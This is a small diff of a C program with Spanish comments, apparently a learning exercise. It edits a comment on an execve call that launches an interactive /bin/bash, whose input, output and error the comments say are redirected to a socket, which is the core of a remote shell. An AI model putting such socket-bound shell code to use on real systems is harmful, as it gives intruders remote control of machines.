@@ -40,7 +40,7 @@ int main() {
     //ejecutamos la shell donde su I/O/E seran redirigos al socket
     execve(
         "/bin/bash", //ruta del ejecutable
-        args, // no hay argumentos para el programa
+        args, // argumentos para el programa -i
         NULL // no hay variable de entorno, como PATH, HOME, USER, etc
     );
     // execve reemplaza el proceso actual por el /bin/sh, distinto a system donde espera a que termine el comando
